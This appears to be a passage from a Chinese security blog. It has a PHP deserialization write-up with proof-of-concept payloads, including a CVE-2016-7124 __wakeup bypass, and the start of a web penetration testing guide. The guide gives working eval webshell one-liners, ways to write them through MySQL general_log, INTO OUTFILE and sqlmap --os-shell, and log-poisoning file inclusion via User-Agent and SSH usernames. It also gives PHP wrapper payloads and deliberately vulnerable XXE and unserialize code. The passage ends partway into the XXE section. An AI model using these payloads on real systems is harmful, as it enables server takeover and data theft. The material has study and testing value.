<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Person.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'Delete.php'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Information</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Person:'</span>.<span class="keyword">$this</span>-&gt;name.<span class="string">'is'</span>.<span class="keyword">$this</span>-&gt;age.<span class="string">'years old&lt;br/&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$per = unserialize($_REQUEST[<span class="string">'file'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>漏洞成因：我们的Person.php文件包含了Delete.php 要想达到任意文件删除的目的就需要控制传入的文件名 而文件名参数是$filename 那怎样控制filename变量就是我们的目的 首先我们知道<code>__destruct</code>魔法函数 是对象销毁的时候执行的 当对Person传一个参数file是 对象销毁 执行魔法函数删除文件操作 因为对传入参数做了反序列化处理所以我们构造一个序列化对象 其中我们构造的对象中filename的值要覆盖掉Delete.php中filename的值来达到删除任意文件的目的。</p>
<p>构造POC：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">delete</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename = <span class="string">'error'</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$melon = <span class="keyword">new</span> delete();</span><br><span class="line">$melon-&gt;filename=<span class="string">'flag.php'</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($melon);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>对Person.php发起请求：<code>file=O:6:&quot;delete&quot;:1:{s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;}</code></p>
<p><img src="/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/rmfile.png" alt="html">    </p>
<p><img src="/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/flag.png" alt="html">    </p>
<h2 id="0x02-关于PHP反序列化的题目"><a href="#0x02-关于PHP反序列化的题目" class="headerlink" title="0x02 关于PHP反序列化的题目"></a>0x02 关于PHP反序列化的题目</h2><p>代码入下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">SoFun</span></span>&#123; </span><br><span class="line">    <span class="keyword">protected</span> $file=<span class="string">'index.php'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file)) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//查找file文件中的字符串，如果有'\\'和'/'在字符串中，就显示错误</span></span><br><span class="line">            <span class="keyword">if</span>(strchr(<span class="keyword">$this</span>-&gt;file,<span class="string">"\\"</span>)===<span class="keyword">false</span> &amp;&amp;  strchr(<span class="keyword">$this</span>-&gt;file, <span class="string">'/'</span>)===<span class="keyword">false</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                show_source(dirname (<span class="keyword">__FILE__</span>).<span class="string">'/'</span>.<span class="keyword">$this</span> -&gt;file);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">'Wrong filename.'</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt; file=<span class="string">'index.php'</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;     </span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))</span><br><span class="line">    &#123; </span><br><span class="line">        show_source(<span class="string">'index.php'</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">       $file=base64_decode( $_GET[<span class="string">'file'</span>]); </span><br><span class="line">       <span class="keyword">echo</span> unserialize($file ); </span><br><span class="line">    &#125; </span><br><span class="line"><span class="meta">?&gt;</span>  <span class="comment">#&lt;!--flag in flag.php--&gt;</span></span><br></pre></td></tr></table></figure>

<p>首先对象创建执行 __destruct函数 我们发现GET获取file参数值的时候会反序列化 我们可以利用反序列化覆盖掉file的值</p>
<p>下面构造payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SoFun</span></span>&#123;</span><br><span class="line">	<span class="keyword">protected</span> $file = <span class="string">'a'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$melon = <span class="keyword">new</span> SoFun();</span><br><span class="line"><span class="keyword">echo</span> serialize($melon);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>生成<code>O:5:&quot;SoFun&quot;:1:{s:7:&quot;*file&quot;;s:1:&quot;a&quot;;}</code> </p>
<p>因为file是protected访问权限所以生成的序列化字符串带*号 绕过访问权限可以在 * 号的两边加 \00</p>
<p>当执行反序列化时 执行__wakeup函数 强制使file的值变为index.php </p>
<p>序列化串行中表示对象属性个数的值大于真实的属性个数时会跳过<code>__wakeup</code>的执行  <a href="https://bugs.php.net/bug.php?id=72663" target="_blank" rel="noopener">CVE-2016-7124</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload1 : O:5:&quot;SoFun&quot;:2:&#123;S:7:&quot;\00*\00file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br><span class="line">payload2 : O:5:&quot;SoFun&quot;:2:&#123;s:11:&quot;\00*\00file&quot;;s:8:&quot;flag.php&quot;;&#125; </span><br><span class="line">当s:11的s是小写时 \00 认为占三位 </span><br><span class="line">当S:7的S是大写时 \00 占一位</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/flagmelon.png" alt="html">    </p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>漏洞挖掘</tag>
        <tag>php</tag>
        <tag>序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>WEB渗透测试之漏洞挖掘</title>
    <url>/2019/12/13/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/</url>
    <content><![CDATA[<p>漏洞：通常情况下不影响软件的正常功能，但如果被攻击者利用，有可能驱使软件去执行一些额外的恶意代码，从而引发严重的后果。最常见的漏洞有缓冲区溢出漏洞、整数溢出漏洞、指针覆盖漏洞等。</p>
<a id="more"></a>

<h2 id="传统WEB查找利用阶段"><a href="#传统WEB查找利用阶段" class="headerlink" title="传统WEB查找利用阶段"></a>传统WEB查找利用阶段</h2><h3 id="1-敏感目录文件扫描"><a href="#1-敏感目录文件扫描" class="headerlink" title="1.敏感目录文件扫描"></a>1.敏感目录文件扫描</h3><h4 id="1-查找目标各类web入口"><a href="#1-查找目标各类web入口" class="headerlink" title="1.查找目标各类web入口"></a>1.查找目标各类web入口</h4><p>普通网站后台，其他web控制台，碰到任何入口的第一反应就是顺手测试弱口令如果没有结果记录下来可以进行爆破，没有验证码的可以尝试爆破。限制登陆次数尝试伪造IP绕过。</p>
<h4 id="2-各类敏感文件泄露"><a href="#2-各类敏感文件泄露" class="headerlink" title="2.各类敏感文件泄露"></a>2.各类敏感文件泄露</h4><h5 id="版本管理软件造成的泄露"><a href="#版本管理软件造成的泄露" class="headerlink" title="版本管理软件造成的泄露"></a>版本管理软件造成的泄露</h5><p><strong>.git/git</strong> 利用工具：<a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">GitHack</a> 手动利用：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget -r --no-parent --mirror http://www.example.com/.git</span><br><span class="line">cd www.example.com &amp;&amp; git reset --hard</span><br></pre></td></tr></table></figure>

<p><strong>.hg/Mercurial</strong> 可以利用工具：<a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">dvcs-ripper</a> 也可以手动利用（下载+回滚）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget -r --no-parent --mirror http://www.example.com/.hg</span><br><span class="line">cd www.example.com &amp;&amp; hg revert</span><br></pre></td></tr></table></figure>

<p><strong>.svn/Subversion</strong> 可以利用工具：<a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">dvcs-ripper</a> 也可以手动利用（下载+回滚）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget -r --no-parent --mirror http://www.example.com/.svn</span><br><span class="line">cd www.example.com &amp;&amp; svn revert --recursive .</span><br></pre></td></tr></table></figure>

<p><strong>.bzr/Bazaar</strong> 可以利用工具：<a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">dvcs-ripper</a> 也可以手动利用（下载+回滚）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget -r --no-parent --mirror http://www.example.com/.bzr</span><br><span class="line">cd www.example.com &amp;&amp; bzr revert</span><br></pre></td></tr></table></figure>

<p>CVS 可以利用工具：<a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">dvcs-ripper</a> 也可以手动利用（下载+回滚）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget -r --no-parent --mirror http://www.example.com/CVS</span><br><span class="line">cd www.example.com &amp;&amp; cvs diff *</span><br></pre></td></tr></table></figure>

<h5 id="文件包含导致的泄露"><a href="#文件包含导致的泄露" class="headerlink" title="文件包含导致的泄露"></a>文件包含导致的泄露</h5><p><strong>.DS_Store文件泄露 (Desktop Services Store)</strong></p>
<p>是macOS目录下的隐藏文件, 包含了当前目录结构和一些的自定义信息,如背景和图标位置等, 在windows下类似的文件为desktop.ini. 暴露了.DS_Store文件也就相当于暴露了该目录下的所有内容. </p>
<p>利用工具：<a href="https://github.com/lijiejie/ds_store_exp" target="_blank" rel="noopener">ds_store_exp</a></p>
<p><strong>WEB-INF泄露</strong></p>
<p>在Java的<a href="http://download.oracle.com/otn-pub/jcp/servlet-2.4-fr-spec-oth-JSpec/servlet-2_4-fr-spec.pdf" target="_blank" rel="noopener">Servlet 文档</a>中,说到<code>WEB-INF</code>目录”包含了所有web应用会用到但是不处于web路径中的资源”, 也就是说, WEB-INF目录下的内容是不属于公开页面的.<br>web应用可以通过<code>getResource</code>等API在servlet的上下文中访问到这些资源.<br>通常开发者会把许多JSP文件,Jar包,Java的类文件放在该目录下. 一般目录的内容都是可以预测的:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">WEB-INF/web.xml : Web应用程序配置文件, 描述了servlet和其他的应用组件配置及命名规则.</span><br><span class="line">WEB-INF/database.properties : 数据库配置文件</span><br><span class="line">WEB-INF/classes/ : 一般用来存放Java类文件(.class)</span><br><span class="line">WEB-INF/lib/ : 用来存放打包好的库(.jar)</span><br><span class="line">WEB-INF/src/ : 用来放源代码(.asp和.php等)</span><br></pre></td></tr></table></figure>

<p>利用方式：通过web.xml文件推测应用组件相关类的名字, 然后在src目录下查找代码, 如果没有源代码可以直接下载class文件反编译即可.</p>
<p><strong>备份文件泄露</strong></p>
<p>备份文件泄露又分为两种情况, 一种是运维人员偷懒地直接在网站根目录用类似<code>tar -czvf bakup.tgz</code>的命令将网站进行备份,这样整站的源代码都能直接被用户打包下载了；<br>另一种是开发或者运维人员使用的编辑器修改文件时自动备份了所编辑的网页内容,<br>如vim的<code>.swp</code>, 从而泄露了该网页的源代码.</p>
<p>利用方法：对于打包文件而言, 渗透测试人员可以用{常用文件名}+{常用压缩包后缀}的方式扫描网站, 说不定会有意外惊喜.<br>对于网页的临时备份文件, 可以扫描对应页面的.swp或者.bak等后缀, 说不定也能找到有用的信息.</p>
<p><strong>配置文件泄露</strong><br>现代WEB开发往往不会重新造轮子, 而是基于成熟的框架进行配置, 如果渗透测试人员知道该网站是基于什么类型的框架,<br>就可能通过该框架的文档获得重要配置文件的路径, 如果是开源框架, 同时也能获得源代码, 因此配置文件泄露的严重性也是不言而喻的.</p>
<p>利用方法：通过识别网站指纹得知其框架类型, 然后手工测试重要的配置文件是否可以获取. 如果是批量测试, 则可以事先准备好常见的配置文件路径, 如wordpress的/wp-config.php等, 组织成字典然后用脚本进行批量测试. 可以参考<a href="https://github.com/ring04h/weakfilescan/blob/master/dict/configfile.lst" target="_blank" rel="noopener">猪猪侠的字典</a>.</p>
<p><strong>配置错误导致的泄露</strong></p>
<p>Windows IIS / Apache 目录穿越</p>
<p>目录穿越漏洞原理比较简单, 程序在实现上没有充分过滤用户输入的../之类的目录跳转符, 导致恶意用户可以访问web根目录的上级从而遍历服务器上的任意文件.</p>
<p><strong>Nginx配置安全</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">location /file &#123;</span><br><span class="line">    alias /home;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>例如这样配置 访问 url/file 会正常显示服务器上/home的文件，但是访问url/file../ 就会出现 /home/../访问到服务器的根目录造成目录穿越</p>
<h3 id="2-SQL注入"><a href="#2-SQL注入" class="headerlink" title="2.SQL注入"></a>2.SQL注入</h3><p>首先确认数据库的用户权限</p>
<h4 id="1-可以注入的一些部分"><a href="#1-可以注入的一些部分" class="headerlink" title="1.可以注入的一些部分"></a>1.可以注入的一些部分</h4><p>GET注入在url中</p>
<p>在POST注入</p>
<p>在HTTP头部注入 例如：cookie Referer user-agent X-Forwarded-For 等等</p>
<p>二次注入，宽字节注入，ajax/json注入，nosql注入，用来对付为静态的中转注入 等等</p>
<h4 id="2-管理员权限"><a href="#2-管理员权限" class="headerlink" title="2.管理员权限"></a>2.管理员权限</h4><p><strong>尝试直接写webshell</strong>：</p>
<p><strong>日志写</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.show variables like ‘%general%&apos;; #查看配置</span><br><span class="line">2.set global general_log = on; #开启general log模式</span><br><span class="line">3.set global general_log_file = ‘/var/www/html/melon.php&apos;; #设置日志目录为shell地址</span><br><span class="line">4.select ‘&lt;?php eval($_POST[melon]);?&gt;’ #写入shell</span><br><span class="line">不成功的案例，如果mysql 被降权，是无法写入到其他的站点目录的，除非你的目标目录是可以写入的。</span><br></pre></td></tr></table></figure>

<p><strong>正常sql写</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">通过SQL注入select into outfile实现，如：</span><br><span class="line">1&apos; union select 1,&apos;&lt;?php eval($_POST[melon]);?&gt;&apos; INTO OUTFILE &apos;/var/www/tmp/nb.php&apos;#</span><br><span class="line">2.如果过过滤了union select可以使用：</span><br><span class="line">LIMIT 0,1 INTO OUTFILE &apos;这里是路径&apos; LINES TERMINATED BY &apos;这里是你想写的内容&apos;--</span><br></pre></td></tr></table></figure>

<p><strong>sqlmap写shell</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--os-cmd=&quot;net user&quot;</span><br><span class="line">交互式命令执行，注意在使用交互式方式时需要知道网站的绝对路径，执行成功之后在绝对路径下创建文件返回结果，然后再自动删除。</span><br><span class="line"></span><br><span class="line">--os-shell</span><br><span class="line">写webshell，会生成两个文件，tmpbshrd.php和tmpucnll.php，分别为命令执行和文件上传webshell。</span><br><span class="line">注意:关闭sqlmap文件就会被删除。</span><br></pre></td></tr></table></figure>

<p><strong>本地写入webshell</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">先在sqlmap的目录创建mst目录，然后在该目录中创建mst.txt，内容为一句话木马，之后需要两个参数即本地文件地址和目标文件地址，--file-write &quot;./mst/mst.txt&quot; --file-dest &quot;网站的绝对路径/melon.php&quot;。</span><br><span class="line">注意需要最高权限。</span><br></pre></td></tr></table></figure>

<p><strong>尝试执行系统命令</strong></p>
<p>反弹shell，cmd</p>
<p><strong>尝试读取数据库配置文件中的账号密码</strong></p>
<h4 id="3-普通数据库权限"><a href="#3-普通数据库权限" class="headerlink" title="3.普通数据库权限"></a>3.普通数据库权限</h4><p>查询网站管理账号密码，搜集会员账号密码数据，尝试万能密码bypass登陆 等等</p>
<h3 id="3-上传"><a href="#3-上传" class="headerlink" title="3.上传"></a>3.上传</h3><h4 id="1-各个web中间件解析漏洞"><a href="#1-各个web中间件解析漏洞" class="headerlink" title="1.各个web中间件解析漏洞"></a>1.各个web中间件解析漏洞</h4><h5 id="IIS-5-x-6-x解析漏洞"><a href="#IIS-5-x-6-x解析漏洞" class="headerlink" title="IIS 5.x-6.x解析漏洞"></a>IIS 5.x-6.x解析漏洞</h5><p>使用iis5.x-6.x版本的服务器，大多为windows server 2003，网站比较古老，开发语句一般为asp；该解析漏洞也只能解析asp文件，而不能解析aspx文件。</p>
<p><strong>目录解析(6.0)</strong></p>
<p>案例：<code>www.xxx.com/xx.asp/xx.jpg</code></p>
<p>原理：服务器默认会把.asp，.asa目录下的文件全部解析乘asp文件</p>
<p><strong>文件解析</strong></p>
<p>案例：<code>www.xxx.com/xx.asp;,jpg</code></p>
<p>原理：服务默认不解析分号之后的内容，因此<code>xx.asp;,jpg</code>便被解析成了asp文件</p>
<p><strong>解析文件类型</strong></p>
<p>IIS6.0默认的可执行文件除了asp还包含这三种：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/xxx.asa /xxx.cer /xxx.cdx</span><br></pre></td></tr></table></figure>

<h5 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a>Apache解析漏洞</h5><p>案例：<code>www.xxx.com/xxx.php.aaa.rar</code></p>
<p>原理：Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如 xxx.php.aaa.rar “.aaa”和”.rar” 这两种后缀是Apache不可识别解析,Apache就会把xxx.php.aaa.rar解析成php。</p>
<p><strong>CVE-2017-15715</strong></p>
<p><strong>罕见后缀</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@xxx:~$ cat /etc/mime.types | grep php</span><br><span class="line">  #application/x-httpd-php          	phtml pht php</span><br><span class="line">  #application/x-httpd-php-source           	phps</span><br><span class="line">  #application/x-httpd-php3         			php3</span><br><span class="line">  #application/x-httpd-php3-preprocessed	 	php3p</span><br><span class="line">  #application/x-httpd-php4         			php4</span><br><span class="line">  #application/x-httpd-php5         			php5</span><br></pre></td></tr></table></figure>

<h5 id="Nginx解析漏洞"><a href="#Nginx解析漏洞" class="headerlink" title="Nginx解析漏洞"></a>Nginx解析漏洞</h5><p>原理：Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。当访问<a href="http://www.xx.com/phpinfo.jpg/test.php这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/test.php”，然后构造成SCRIPT_FILENAME传递给PHP" target="_blank" rel="noopener">www.xx.com/phpinfo.jpg/test.php这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/test.php”，然后构造成SCRIPT_FILENAME传递给PHP</a> CGI，但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢?这就要说到fix_pathinfo这个选项了。 如果开启了这个选项，那么就会触发在PHP中的如下逻辑：<br>PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而test.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解析了</p>
<p>案例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www.xxxx.com/UploadFiles/image/melon.jpg/melon.php</span><br><span class="line">www.xxxx.com/UploadFiles/image/melon.jpg%00.php</span><br><span class="line">www.xxxx.com/UploadFiles/image/melon.jpg/%20\melon.php</span><br></pre></td></tr></table></figure>

<h4 id="2-bypass-上传检测"><a href="#2-bypass-上传检测" class="headerlink" title="2.bypass 上传检测"></a>2.bypass 上传检测</h4><p>黑名单，白名单可配合解析漏洞，截断，.htaccess，配合本地包含一起利用。</p>
<p>补：截断：%00</p>
<h4 id="3-各类编辑器利用"><a href="#3-各类编辑器利用" class="headerlink" title="3.各类编辑器利用"></a>3.各类编辑器利用</h4><p>FCKeditor编辑器，EWEbeditor，CKFinder，南方数据编辑器southidceditor，UEDITOE，DotNetTextBox，PHPWEB网站管理系统后台Kedit编辑器，Cute Editor 在线编辑器本地包含漏洞 等等</p>
<h3 id="4-未授权访问"><a href="#4-未授权访问" class="headerlink" title="4.未授权访问"></a>4.未授权访问</h3><p>前端验证绕过，直接访问[ajax]，验证有死角没有验证全部页面 等等</p>
<h3 id="5-文件包含"><a href="#5-文件包含" class="headerlink" title="5.文件包含"></a>5.文件包含</h3><p><em>本地包含（LFI），远程包含（RFI），远程文件包含需要在php.ini中开启 allow_url_fopen=on、allow_url_include=on(默认是关闭的 )。</em></p>
<p>文件包含的本质其实和C语言中预处理指令一样。那么这句话等价替换就是 <code>&lt;?php &lt;?php phpinfo()?&gt; ?&gt;</code>其实不然，如果替换成这样，后面的?&gt;会被页面打印出来,正确的是它是将文件中<code>&lt;?php ?&gt;</code> 去除，将剩余的内容进行替换,那这样的话再利用的时候不用考虑文件包含的文件类型是什么，只需要考虑文件之中是否有我们所需要的一句话木马就可以了。</p>
<p><strong>涉及的函数</strong>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">include()</span><br><span class="line">使用此函数，只有代码执行到此函数时才将文件包含进来，发生错误时只警告并继续执行。</span><br><span class="line">inclue_once()</span><br><span class="line">功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。</span><br><span class="line">require()</span><br><span class="line">使用此函数，只要程序执行，立即调用此函数包含文件，发生错误时，会输出错误信息并立即终止程序。</span><br><span class="line">require_once()</span><br><span class="line">功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。</span><br></pre></td></tr></table></figure>

<p><strong>测试</strong>：</p>
<p>melon.txt代码为  <code>&lt;?php eval($_REQUEST[&#39;melon&#39;]);?&gt;</code></p>
<p>melon.php代码为    <code>&lt;?php include($_REQUEST[&#39;file&#39;]);?&gt;</code></p>
<p>利用：<code>www.xxx.com/melon.php?file=melon.txt&amp;melon=system(&#39;ls&#39;);</code></p>
<p>防止混淆：目录遍历：如果没有文件包含漏洞，仅仅通过在url栏中操作，不论你如何../../../回退，都无法跳出服务器的公开目录，也是就说，你只能请求公开目录中的文件。但是如果有文件包含漏洞，那么我们可以通过传参，../../../../../一直退到服务器的根目录，从而能够目录遍历，即访问服务器上任何一个文件夹中的任何一个文件，不论这个目录是公开目录还是非公开目录。</p>
<p><strong>利用本地包含配合数据库获取shell的一种思路</strong>：</p>
<p>数据库储存表会将表存在相应的文件中。也就说假如我们将某个表的某个字段名，命名为<code>&lt;?php eval($_GET[&#39;melon&#39;]);?&gt;</code>,那么这句话就会被写入到对应的.frm文件中去。</p>
<p>在本地创建melon.php文件代码为    <code>&lt;?php include($_REQUEST[&#39;file&#39;]);?&gt;</code></p>
<p>创建数据库-&gt;创建表-&gt;创建字段为<code>&lt;?php eval($_GET[&#39;melon&#39;]);?&gt;</code></p>
<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%A9%E7%94%A8.png" alt="html">    </p>
<p>图中可以明确的看出一句话已经写进了文件了这时候只需要利用即可</p>
<p> <code>http://www.xxx.com/melon.php?file=../../../../../../../phpStudy/PHPTutorial/MySQL/data/melon/test.frm&amp;melon=phpinfo();</code></p>
<p>还有一个问题就是获取数据库的路径如果没有这一点我们是无法知道frm的位置的，如果有sql注入我们可以通过<code>SELECT @@datadir</code>来获取data文件夹绝对路径然后拼接上我们的 数据库名/表名.frm 就可以了。</p>
<p><strong>利用本地包含配合Apache获取shell的一种思路</strong>：</p>
<p>使用burp对目标站抓包 修改User-Agent: <code>&lt;?php include($_REQUEST[&#39;file&#39;]);?&gt;</code></p>
<p>此时查看Apache日志：</p>
<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/apachelog.png" alt="html">    </p>
<p>利用：<code>http://url/file.php?file=/var/log/apache2/access.log?melon=phpinfo();</code></p>
<p><strong>利用本地包含配合ssh获取shell的思路</strong></p>
<p>首先ssh的登陆日志放在了<code>/var/log/auth.log</code>中</p>
<p>我们让用户名等于php一句话<code>&lt;?php @eval($_GET(&#39;melon&#39;));?&gt;</code></p>
<p>然后查看ssh的日志 利用包含实现getshell</p>
<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/sshlogin.png" alt="html"></p>
<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/sshlog.png" alt="html">    </p>
<p><strong>php伪协议</strong></p>
<p>php://filter 读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php://filter在双off的情况下也可以正常使用；</span><br><span class="line">allow_url_fopen ：off/on</span><br><span class="line">allow_url_include：off/on</span><br></pre></td></tr></table></figure>

<p><code>http://url/file.php?file=php://filter/read=convert.base64-encode/resource=./file.php</code></p>
<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/filebase64.png" alt="html">    </p>
<p>php://input 可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">allow_url_fopen ：off/on</span><br><span class="line">allow_url_include：on</span><br></pre></td></tr></table></figure>

<p><code>http://localhost:8888/file.php?file=php://input</code> 同时POST <code>&lt;?php phpinfo();?&gt;</code></p>
<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/filephpinput.png" alt="html">    </p>
<p>zip://, bzip2://, zlib:// 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zip://, bzip2://, zlib://协议在双off的情况下也可以正常使用；</span><br><span class="line">allow_url_fopen ：off/on</span><br><span class="line">allow_url_include：off/on</span><br></pre></td></tr></table></figure>

<p>zip:// 协议</p>
<p>使用方法：zip:// [压缩文件绝对路径]#[压缩文件内的子文件名]</p>
<p>在get请求中#会将后面的参数忽略所以使用get请求时候应进行url编码为%23，且此处经过测试相对路径是不可行，所以只能用绝对路径。</p>
<p><code>http://127.0.0.1:8888/file.php?file=zip://D:/PHPstudy/PHPTutorial/WWW/CRMEB-master/melon.zip%23file.txt</code></p>
<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/phpzip.png" alt="html">    </p>
<p>bzip2:// 协议</p>
<p>使用方法：<code>http://127.0.0.1:8888/file.php?file=compress.bzip2://./melon.bz2</code></p>
<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/phpbz2.png" alt="html">    </p>
<p>zlib:// 协议</p>
<p>使用方法：<code>http://127.0.0.1:8888/file.php?file=compress.zlib://./melon.gz</code></p>
<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/phpgz.png" alt="html">    </p>
<p>data://协议</p>
<p>经过测试官方文档上存在一处问题，经过测试PHP版本5.2，5.3，5.5，7.0；data:// 协议是是受限于allow_url_fopen的，官方文档上给出的是NO，所以要使用data://协议需要满足双on条件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">data://协议必须双在on才能正常使用；</span><br><span class="line">allow_url_fopen ：on</span><br><span class="line">allow_url_include：on</span><br></pre></td></tr></table></figure>

<p>使用方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8888/file.php?file=data://text/plain,&lt;?php phpinfo()?&gt;</span><br><span class="line">http://127.0.0.1:8888/file.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/phpdata.png" alt="html">    </p>
<h3 id="6-任意文件读取"><a href="#6-任意文件读取" class="headerlink" title="6.任意文件读取"></a>6.任意文件读取</h3><p><strong>XXE（有回显）</strong></p>
<p>PHP代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xxe.php文件</span><br><span class="line">&lt;?php</span><br><span class="line">    libxml_disable_entity_loader (false);</span><br><span class="line">    $xmlfile = file_get_contents(&apos;php://input&apos;);</span><br><span class="line">    $dom = new DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">    $creds = simplexml_import_dom($dom);</span><br><span class="line">    echo $creds;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

